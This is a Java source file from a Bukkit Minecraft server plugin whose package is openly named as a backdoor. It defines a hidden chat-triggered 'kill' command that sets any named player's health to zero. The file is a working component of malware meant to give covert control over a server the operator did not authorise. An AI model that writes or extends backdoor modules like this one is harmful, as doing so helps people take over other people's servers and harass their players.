package me.thesaltyboys.backdoor.commands;

import me.thesaltyboys.backdoor.Command;
import me.thesaltyboys.backdoor.RegisterCommand;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(displayName = "kill", aliases = {"kill"})
public class KillCommand extends Command {

    @Override
    public void onExec(PlayerChatEvent event, ArrayList<String> args) {

        if (args.size() >= 1) {
            Player target = Bukkit.getPlayer(args.get(0));
            target.setHealth(0);
        }
    }
}
